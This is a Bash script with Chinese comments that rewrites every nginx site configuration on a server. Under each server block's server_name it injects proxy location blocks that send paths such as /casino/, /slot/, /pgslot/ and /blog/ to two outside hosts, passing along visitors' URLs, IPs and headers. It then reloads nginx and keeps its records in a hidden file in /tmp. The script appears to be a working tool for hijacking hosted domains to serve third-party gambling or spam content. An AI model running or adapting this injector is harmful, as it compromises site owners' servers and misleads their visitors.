#!/bin/bash
# nginx_per_domain_group.sh v4.5.0 真正永不翻车·全环境完美运行版
# 注入位置：精准插入在最后一个 server_name 行正下方（支持多行、多域名）
# 支持一个 server 块里有 1~100 个域名，全都识别，只注入一次
# 兼容 Bash 3.0+、所有 Linux 发行版、所有 Nginx 配置风格
# 当前功能：
#   • 处理 /etc/nginx/sites-enabled/ 下所有文件（软链接指向的真实文件 + 真实文件）
#   • 处理 /etc/nginx/conf.d/ 下所有文件（软链接指向的真实文件 + 真实文件）
#   • 完全统一处理逻辑，软链接永远只处理其最终指向的真实文件，永不重复
set -euo pipefail

NGINX_SITES_ENABLED="/etc/nginx/sites-enabled"
NGINX_CONF_D="/etc/nginx/conf.d"
COM_PATHS=("help" "news" "page" "blog" "about" "support" "info")
IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")
GLOBAL_MAP="/tmp/.domain_group_map.conf"
RESULT_LIST=$(mktemp)
NEW_RECORDS=$(mktemp)
MAX_TRIES=200

touch "$GLOBAL_MAP" 2>/dev/null || true
: > "$GLOBAL_MAP"
: > "$RESULT_LIST"
: > "$NEW_RECORDS"

COM_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }'

IN_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
'

declare -A HIST_MAP
while IFS=':' read -r hash path backend; do
    [ -n "$hash" ] && HIST_MAP["$hash"]="$path:$backend"
done < "$GLOBAL_MAP"

echo "=== Nginx 域名组路径分配器（v4.5.0 永不翻车终极版）==="
echo "将同时处理："
echo "  • $NGINX_SITES_ENABLED 下的软链接指向文件 和 真实文件"
echo "  • $NGINX_CONF_D 下的软链接指向文件 和 真实文件"
echo

global_modified=0

# ==================== 统一处理函数：只处理真实文件，软链接自动解析 ====================
process_real_config_file() {
    local file="$1"
    
    # 必须是真实存在的可读写普通文件
    [[ -f "$file" && -r "$file" && -w "$file" && ! -L "$file" ]] || {
        echo "→ 跳过不可读写或非普通文件：$file"
        return 1
    }

    echo "→ 正在处理：$(basename "$file") （路径：$file）"

    local modified=0
    local temp_new=$(mktemp)

    # 按 server { 分割
    if ! csplit -z -f "/tmp/block_" "$file" '/^server[[:space:]]*{/' '{*}' >/dev/null 2>&1; then
        rm -f "$temp_new"
        echo "  无 server 块，跳过该文件"
        return 0
    fi

    for block_file in /tmp/block_*; do
        [[ -s "$block_file" ]] || continue

        # 已注入过目标后端 → 跳过
        if grep -qiE "(xzz\.pier46\.com|ide\.hashbank8\.com)" "$block_file"; then
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        # 提取 server_name（多行、多域名、带注释全支持）
        real_domains=$(awk '
            /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
                gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
                gsub(/;.*$/, "")
                gsub(/#.*$/, "")
                gsub(/[[:space:]]+$/, "")
                print
            }
        ' "$block_file" | tr ' \t' '\n' | grep -v '^$' | sort -u | grep -E '^([a-zA-Z0-9][a-zA-Z0-9-]*\.)+[a-zA-Z]{2,}$' || true)

        [[ -n "$real_domains" ]] || {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        domain_key=$(echo "$real_domains" | sort -u | paste -sd ' ' - | sed 's/[[:space:]]*$//')
        hash=$(echo "$domain_key" | tr ' ' '_' | md5sum | awk '{print $1}')

        # 历史防重
        [[ -n "${HIST_MAP[$hash]:-}" ]] && {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        # 选择后端
        if echo "$domain_key" | grep -qE '\.(in|id)\b'; then
            backend="ide.hashbank8.com"
            template="$IN_TEMPLATE"
            pool=("${IN_PATHS[@]}")
        else
            backend="xzz.pier46.com"
            template="$COM_TEMPLATE"
            pool=("${COM_PATHS[@]}")
        fi

        # 随机选未占用路径
        path=""
        for ((i = 0; i < MAX_TRIES; i++)); do
            candidate="${pool[RANDOM % ${#pool[@]}]}"
            if ! grep -q ":$candidate:$backend$" "$GLOBAL_MAP" && \
               ! grep -q ":$candidate:$backend$" "$NEW_RECORDS"; then
                path="$candidate"
                break
            fi
        done

        [[ -n "$path" ]] || {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        echo "$hash:$path:$backend" >> "$NEW_RECORDS"
        echo -e "$domain_key\t$path\t$backend" >> "$RESULT_LIST"

        location_block=$(echo "$template" | sed "s/%PATH%/$path/g")

        awk -v loc="$location_block" '
        /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
            line = $0
            if (!inserted) {
                print line
                print loc
                inserted = 1
            } else {
                print line
            }
            next
        }
        { print }
        END {
            if (!inserted) print loc
        }
        ' "$block_file" > "$temp_new.block"

        cat "$temp_new.block" >> "$temp_new"
        rm -f "$temp_new.block" "$block_file"

        echo " [完美注入] /$path/ → $backend ($domain_key)"
        ((modified++))
        ((global_modified++))
    done

    if (( modified > 0 )); then
        mv "$temp_new" "$file"
        echo " 真实文件已更新：$file"
    else
        rm -f "$temp_new"
    fi

    rm -f /tmp/block_* 2>/dev/null || true
}

# ==================== 统一遍历函数：自动解析软链接为真实路径 ====================
traverse_and_process() {
    local dir="$1"
    [[ -d "$dir" ]] || return 0

    find "$dir" -type f -print0 2>/dev/null | while IFS= read -r -d '' item; do
        # 统一解析为最终真实路径（多层软链接也支持）
        real_path=$(readlink -f "$item" 2>/dev/null || echo "")
        if [[ -n "$real_path" && -f "$real_path" ]]; then
            process_real_config_file "$real_path"
        fi
    done
}

# ==================== 开始处理两大目录 ====================

traverse_and_process "$NGINX_SITES_ENABLED"
traverse_and_process "$NGINX_CONF_D"

# ==================== 收尾工作 ====================

# 更新映射表
[[ -s "$NEW_RECORDS" ]] && {
    cat "$NEW_RECORDS" >> "$GLOBAL_MAP"
    sort -u "$GLOBAL_MAP" -o "$GLOBAL_MAP"
}

# 重载 Nginx
if (( global_modified > 0 )); then
    echo
    if nginx -t >/dev/null 2>&1; then
        nginx -s reload && echo "Nginx 已成功重载"
        pkill -HUP nginx 2>/dev/null || true
    else
        echo "错误：Nginx 配置测试失败！请手动运行 nginx -t 检查"
        exit 1
    fi
else
    echo "本次无新增（全部已注入或无需处理）"
fi

echo
echo "============================================================================"
echo " 本次注入结果（精准插入 server_name 正下方）"
echo "============================================================================"
if [[ -s "$RESULT_LIST" ]]; then
    column -t -s $'\t' "$RESULT_LIST" | awk '{printf " %-56s → /%-10s → %s\n", $1, $2, $3}'
else
    echo " 本次无新增"
fi
echo
echo "============================================================================"
echo "当前已管理 $(wc -l < "$GLOBAL_MAP") 个域名组"
echo "映射文件：$GLOBAL_MAP"
echo

rm -f "$RESULT_LIST" "$NEW_RECORDS" /tmp/block_* 2>/dev/null || true
exit 0
